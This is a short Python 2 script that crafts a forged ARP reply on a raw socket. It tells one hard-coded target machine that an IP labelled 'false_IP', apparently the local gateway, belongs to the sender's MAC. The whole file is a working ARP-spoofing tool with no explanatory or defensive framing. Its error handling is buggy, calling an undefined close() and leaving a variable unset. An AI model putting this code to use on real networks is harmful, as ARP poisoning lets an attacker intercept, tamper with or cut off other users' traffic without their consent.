import sys
import struct
import os
import socket
import string


#ETH_TARGET = '00:e0:4c:53:44:58'
ETH_TARGET = '\x00\xe0\x4c\x53\x44\x58'
ETH_TYPE_ARP= 0x0806


def send_arp( ifname , address ):
	""" send out a arp """
	try:
		eth_socket =  socket.socket( socket.AF_PACKET , socket.SOCK_RAW) ;
		eth_socket.bind( (ifname , ETH_TYPE_ARP) ) ;
		print eth_socket.getsockname() ;
		eth_addr = eth_socket.getsockname()[4] ;
		print len(eth_addr)
		print len(ETH_TARGET )
		
	except socket.error, (errno , msg ) :
		if errno == 1 :
			print "arp message can only be sent by root" 
			close( eth_socket ) ;
			return False ;
	
	arp_frame = [
		struct.pack( "!h" , 1 ) ,

		struct.pack("!h", 0x0800 ) ,

		struct.pack("!B" , 6 ) ,

		struct.pack("!B" , 4 ) ,

		struct.pack("!h" , 2 ) ,

		eth_addr ,

		socket.inet_aton( address ) ,

		eth_addr ,

		socket.inet_aton( address )
	]

	eth_frame = [
		ETH_TARGET,

		eth_addr ,
		struct.pack("!h" , ETH_TYPE_ARP ),
		''.join( arp_frame )

	]

	eth_socket.send(''.join(eth_frame) );
	eth_socket.close();


false_IP = '114.212.80.1'
another_IP = "114.212.87.245"

if __name__ == '__main__':
	send_arp( 'eth0' , false_IP );
	print "lllll"

